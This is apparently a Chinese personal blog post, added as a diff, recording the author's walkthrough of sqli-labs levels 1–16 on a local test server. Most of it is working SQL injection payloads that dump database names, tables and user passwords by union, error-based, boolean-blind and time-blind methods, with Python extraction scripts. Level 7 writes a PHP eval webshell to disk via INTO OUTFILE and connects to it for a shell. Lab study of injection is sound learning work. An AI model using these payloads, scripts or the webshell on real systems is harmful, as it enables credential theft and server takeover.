@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    sql-labs刷题记录 |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-sqli labs刷题手册"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  sql-labs刷题记录
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/10/02/sqli%20labs%E5%88%B7%E9%A2%98%E6%89%8B%E5%86%8C/" class="article-date">
+  <time datetime="2020-10-02T03:05:52.000Z" itemprop="datePublished">2020-10-02</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/">web技术学习</a> / <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">4.1k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">17 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>记录sql-labs学习</p>
+<span id="more"></span>
+
+<p><strong>先看一下IMformation_schema结构</strong></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B5PhcR"><img src="https://s1.ax1x.com/2020/11/07/B5PhcR.png" alt="B5PhcR.png"></a></p>
+<h2 id="Less-1（1-4联合注入）"><a href="#Less-1（1-4联合注入）" class="headerlink" title="Less-1（1-4联合注入）"></a>Less-1（1-4联合注入）</h2><p>小白可以先看这两篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/22397455">文章1</a> <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/22397620">文章2</a></p>
+<p>我们先来判断注入类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; and 1=1 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure>
+
+<p>经这两者判断，第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是单引号类型注入。 先判断字段数。依次递增order by 后面的数值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 1 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 2 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
+
+<p>发现3时不报错,而4时报错，所以字段数是3。<br>接下来用联合查询判断显示位。首先我们要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。在这里我们使用100。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=100&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B5kf3Q"><img src="images/B5kf3Q.png" alt="B5kf3Q.png"></a></p>
+<p>接下来就是常规操作</p>
+<p><code>爆库:http://127.0.0.1/sqli-labs-master/Less-1/?id=100&#39; union select 1,2,database() --+</code></p>
+<p><code>爆表:http://127.0.0.1/sqli-labs-master/Less-1/?id=100&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
+<p><code>爆字段:http://127.0.0.1/sqli-labs-master/Less-1/?id=100&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; --+</code></p>
+<p><code>爆值:http://127.0.0.1/sqli-labs-master/Less-1/?id=100&#39; union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+</code></p>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>这道题和上面那道其实很类似。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1 and 1=1 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1 and 1=2 --+</span><br></pre></td></tr></table></figure>
+
+<p>第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是数值类型注入。<br>之后的注入类型与Less-1雷同(仅需把单引号去掉而已)。不再赘述。</p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>我们先传入id=1’,可以得到这样的报错信息。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B5eq1S"><img src="https://s1.ax1x.com/2020/11/07/B5eq1S.png" alt="B5eq1S.png"></a></p>
+<p>分析以下句子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY&#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>左右两边的单引号是代表是字符串，再分析下面句子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>1‘ 是我们传进去的，由报错信息可知，后台的sql语句应该带有括号，并且有<code>&#39;</code>,即<code>(&#39;$id&#39;)</code></p>
+<p>由此看出，我们需要闭合’) </p>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>老样子输入 ’ 看看是否有报错</p>
+<p>发现输入 “  会有报错，分析可得 我们需要闭合 ”）</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B5QPOS"><img src="https://s1.ax1x.com/2020/11/07/B5QPOS.png" alt="B5QPOS.png"></a></p>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>这题不管我们怎么输入，只有两种回显状态，<strong>我们使用floor报错注入</strong></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bofgn1"><img src="https://s1.ax1x.com/2020/11/08/Bofgn1.png" alt="Bofgn1.png"></a></p>
+<h3 id="playload"><a href="#playload" class="headerlink" title="playload:"></a>playload:</h3><p><code>爆库:http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<p><code>爆表:http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bo5hNV"><img src="https://s1.ax1x.com/2020/11/08/Bo5hNV.png" alt="Bo5hNV.png"></a></p>
+<p>这里发现页面提示我输出信息超过一行，所以我们要采用limit语句来控制输出。</p>
+<p>根据limit不断递增即可得到全部值。</p>
+<p><code>爆字段:http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()limit 0,1 ),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><ul>
+<li>floor () 报错原理</li>
+</ul>
+<p>研究了一下午，总算是把这个原理搞懂了。<br>利用 floor () 函数使 SQL 语句报错，实际上是由 rand () ， count () ， group by 三个函数语句联合使用造成的。<br>首先，看一下语句中使用到的函数和子句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. concat： 连接字符串功能</span><br><span class="line">2. floor： 取float的整数值(向下取整）</span><br><span class="line">3. rand： 取0~1之间的随机浮点值</span><br><span class="line">4. group by： 根据一个或多个列对结果集进行分组并有排序功能</span><br><span class="line">5. floor(rand(0)*2)： 随机产生0或1</span><br></pre></td></tr></table></figure>
+
+<p>刚才已经说了 利用 floor () 的报错注入实际上是由 rand () ， count () ， group by 三个函数语句联合使用造成的，想要搞清楚原理我们首先来分析单个，<br>从 group by 子句开始，<br>这里我建了一个 person 表测试：<br><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2915214011.png" alt="2.png">我们通过 page 年龄这个字段来对表中数据分组：<img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/916623330.png" alt="3.png">可以看到我们出现了一个新的数据表，有 page 、 count (<em>) 这两个字段，count (</em>) 字段下表示每个年龄人的数量，可以联想到 group by 子句的执行流程，最初时，page-count (<em>) 这个数据表是空的，通过一行一行读原数据表中的 page 字段，如果读到的 page 在 page-count (</em>) 数据表中不存在，就将它插入，并且将对应的 count (<em>) 赋为 1，如果存在，就将其对应的 count (</em>) +1，直至扫完整个数据表。</p>
+<blockquote>
+<p>Tips：这里有一点需要注意， group by 后跟的字段名是作为虚拟表的主键，主键不能重复，这也是报错的关键点。</p>
+</blockquote>
+<p>报错的主要原因是虚拟表的主键重复，那我们来看一下是哪里，在什么情景下重复了。<br>这时候用到 rand () 函数了，继续来了解 rand () 函数的用法：</p>
+<ol>
+<li>生成 0~1 之间的随机浮点值</li>
+<li>可以给 rand () 传一个参数作为 rand () 的种子，然后 rand 函数会依据这个种子进行随机生成</li>
+</ol>
+<p>这里加上 floor () 函数的用法：</p>
+<ol>
+<li>floor： 取 float 的整数值 (向下取整）</li>
+</ol>
+<p>所以，floor (rand ()*2) 和 floor (rand (0)*2) 表示产生 0 或者 1。<br>我们来比较下它们的区别：<br><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/1346366380.png" alt="4.png"><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/1683359691.png" alt="5.png">可以看得出来  **floor (rand (0)*2)**是有规律的 。</p>
+<p><strong>报错原因解析</strong></p>
+<p>通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by 语句报错的原因</p>
+<p>是 floor(random(0)*2)的不确定性，即可能为 0 也可能为 1</p>
+<p>group by key 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，</p>
+<p>如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果</p>
+<p>该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算</p>
+<p>rand 值）</p>
+<p>如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临</p>
+<p>时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为 1，就</p>
+<p>会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值</p>
+<p>实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行</p>
+<p>时是不报错的。</p>
+<blockquote>
+<p>Tips: 综上所述，当数据表记录大于三时，使用 group by floor (rand (0)<em>2) 一定报错。</em></p>
+<p>*在测试过程中，发现 rand(14)*2只需要两条数据就能报错。但如果from的表中只有一条数据的话floor()报错注入就没法用了，毕竟是重复，只插入一条数据怎么主键重复，对吧。</p>
+</blockquote>
+<p><strong>最后一句话总结下：floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</strong></p>
+<h3 id="xpath语法错误报错注入"><a href="#xpath语法错误报错注入" class="headerlink" title="xpath语法错误报错注入"></a>xpath语法错误报错注入</h3><p>从mysql5.1.5开始提供两个XML查询和修改的函数，<strong>extractvalue和updatexml</strong>。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容。</p>
+<h4 id="updatexml（）函数"><a href="#updatexml（）函数" class="headerlink" title="updatexml（）函数"></a>updatexml（）函数</h4><ul>
+<li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li>
+<li>作用：改变文档中符合条件的节点的值</li>
+<li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li>
+<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+<p>第一个参数表示目标 xml 文档，第二个参数表示 xml 路径。<br>我们主要利用在第二个参数的位置，当正常查询时，第二个参数应该是 /xxx/xxx/xxx/… 这种形式。<br>如果写成其他形式就会报错。<br>当正常查询时，即使查询不到也不会报错。<br><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2621929796.png" alt="7.png">当我们尝试报错注入时：测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pname,page from person where pwd = &#x27;111&#x27; and (extractvalue(&#x27;hhhhhhh&#x27;,concat(0x7e,(select database()))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2034180883.png" alt="8.png"></p>
+<blockquote>
+<p>Tips: extractvalue () 能查询字符串的最大长度为 32，就是说如果我们想要的结果超过 32，就需要用 substring () 函数截取。</p>
+</blockquote>
+<p>测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pname,page from person where pwd = &#x27;111&#x27; and (extractvalue(&#x27;hhhhhhh&#x27;,concat(0x7e,substring(hex((select database())),1,20))));</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/1631177789.png" alt="9.png"><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2352499770.png" alt="10.png"></p>
+<blockquote>
+<p>总结：利用 xpath 字符串格式报错进行注入，要注意查询字符长度限制。</p>
+</blockquote>
+<h4 id="extractvalue（）函数"><a href="#extractvalue（）函数" class="headerlink" title="extractvalue（）函数"></a>extractvalue（）函数</h4><ul>
+<li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li>
+<li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li>
+<li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+<p>updatexml () 报错与 extractvalue () 报错类似，都是由于 xpath 格式错误报错，同样能查询字符串的最大长度为 32，同样在第二个参数出插入我们需要的语句代码。<br>测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pname,page from person where pwd = &#x27;111&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/923618974.png" alt="11.png"></p>
+<blockquote>
+<p>总结：利用 xpath 字符串格式报错进行注入，要注意查询字符长度限制。</p>
+</blockquote>
+<p><strong>利用extractvalue()报错和updatexml()报错均只能查询32及以内长度的字符，当超出32时，我们要结合mid()和substr()来进行注入。</strong></p>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>学会一项新技能，利用burpsuit进行fuzz，发现需要闭合 “ ，后面的playload和Less-5一样了。</p>
+<p>我用的是burp自带的fuzz字典</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BoORHg"><img src="https://s1.ax1x.com/2020/11/08/BoORHg.png" alt="BoORHg.png"></a></p>
+<p>可以看见 “ 报错了</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BoO44s"><img src="https://s1.ax1x.com/2020/11/08/BoO44s.png" alt="BoO44s.png"></a></p>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>这题是有关文件读取与注入的。这种题目一般有两个难点。<br>1.要有读取文件的权限<br>2.要知道绝对物理路径<br>对于这道题，我们先经过fuzz确定需要闭合’))。又由于我们是本机操作所以默认知道了绝对路径。因此上传一句话木马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#x27;))UNION SELECT 1,2,&#x27;&lt;?php @eval($_post[“t”])?&gt;&#x27; into outfile &quot;C:\\vip\\sqli-labs-master\\Less-7\\c.php&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>之后使用中国菜刀连接即可getshell。<br>注意:地址中的每个\都要在前面加上另外一个\来转义</p>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>经过简单测试，这道题我们需要闭合’。和Less-5一样没有显示位。但是和Less-5的区别在于过滤了报错语句，所以我们不能使用报错注入，只能使用布尔盲注和延时注入。在这里我们使用布尔盲注。我这里使用了一个半自动的布尔盲注脚本。</p>
+<p>布尔盲注详细请看大佬: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/zane-s/articles/12371820.html#CRWcQXhE">布尔盲注</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and ord(substr(playload,&#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class="line">result =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>,<span class="number">127</span>):</span><br><span class="line">		payload = url.<span class="built_in">format</span>(i,j)</span><br><span class="line">		r = requests.get(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;are&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			result += <span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="built_in">print</span> (result)</span><br><span class="line">			<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>playload 那里填入我们的注入的语句</p>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>这道题考的是延时注入。经测试，无论输入什么都是返回You are in…所以我们不能根据页面的返回来判断是否执行语句，也就是不能执行布尔注入。</p>
+<p>时间盲注参考大佬:<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4368807/blog/4497390">时间盲注</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and sleep(5)--+</span><br></pre></td></tr></table></figure>
+
+<p>我们先进行此语句，发现页面没有立刻返回，说明语句已经被执行。说明我们闭合正确了。我继续用了一个半自动的脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if(ord(substr(database(),&#123;&#125;,1))=&#123;&#125;,sleep(5),1)--+&quot;</span></span><br><span class="line">result  = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>,<span class="number">127</span>):</span><br><span class="line">		payload = url.<span class="built_in">format</span>(i,j)</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		r = requests.get(payload)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		time3 = time2 - time1</span><br><span class="line">		<span class="keyword">if</span> time3 &gt; <span class="number">4</span>:</span><br><span class="line">			result += <span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="built_in">print</span> (result)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>首先测试闭合。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-10/?id=1&#x27; and sleep(5)--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-10/?id=1&#x27;) and sleep(5)--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-10/?id=1&#x27;)) and sleep(5)--+</span><br></pre></td></tr></table></figure>
+
+<p>测试这上面三个发现都立刻加载出页面，说明语句没有被执行。再测试双引号发现可以被执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-10/?id=1&quot; and sleep(5)--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>从这关开始就进入post注入的范围了。但是其实post注入和get注入差别不大。<br>我们先对username传入admin’# ,密码随便输。可以发现我们登陆成功，显示出了admin账号的密码。接下来的注入过程类似Less-1。<br>先用order by判断出有两个字段。再依次对username进行传参。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27; union select 1,database()#</span><br><span class="line">username=1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">username=1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;#</span><br><span class="line">username=1&#x27; union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#</span><br></pre></td></tr></table></figure>
+
+<p>至于这个过程,password可以随便输入。因为当你传进去username的参数后，后台的sql语句变成这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=&#x27;1&#x27; union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，password部分已经被我们注释掉了，从而达到了绕过的目的。</p>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>这一关和Less-11几乎一样，只是闭合方式从’变成了”)，改变闭合方式后剩余步骤模仿Less-11就行。 这里解释一下一个问题，就是我们对username传入1’ or 1=1#后发现我们是以dumb账号登陆。这里是因为他在语句后面加了limit限制只允许输出一条数据的原因，而dumb账号在表中的优先级是最高的，所以优先输出dumb账户的数据。</p>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>经测试，可用’)来进行闭合，但是闭合后发现没有显示位，测试了一下发现可以使用报错注入。这次我使用extractvalue()报错。<br>依次对username进行传参。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username:1&#x27;) and extractvalue(1,concat(1,database()))#</span><br><span class="line">username:1&#x27;) and extractvalue(1,concat(1,(select (table_name) from information_schema.tables where table_schema=database() limit 0,1)))#</span><br><span class="line">username:1&#x27;) and extractvalue(1,concat(1,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)))#</span><br><span class="line">username:1&#x27;) and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>这道题和上一道题基本一样，只是转换闭合方式为 “。之后步骤模仿Less-13即可</p>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>页面有回显，但是无法使用报错注入。故使用布尔盲注。<br>这里继续用一个半自动的脚本来解决:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">result =&quot;&quot;</span><br><span class="line">for i in range(1,10):</span><br><span class="line">	for j in range(65,150):</span><br><span class="line">		payload1 = &quot;admin&#x27;^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)^1#&quot;.format(i,j)</span><br><span class="line">		payload2 = &quot;admin&#x27;^(ascii(mid(database()from &#123;&#125;))&gt;&#123;&#125;)^1%23&quot;.format(i,j)</span><br><span class="line">		data = &#123;&quot;uname&quot;:payload1,&quot;passwd&quot;:&quot;123&quot;&#125;</span><br><span class="line">		r = requests.post(url,data=data)</span><br><span class="line">		if &quot;slap.jpg&quot; in r.text:</span><br><span class="line">			result += chr(j)</span><br><span class="line">			print result</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>这道题和Less-15基本一样。只不过把闭合换成了”)而已，只需要更改脚本即可得出结果。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
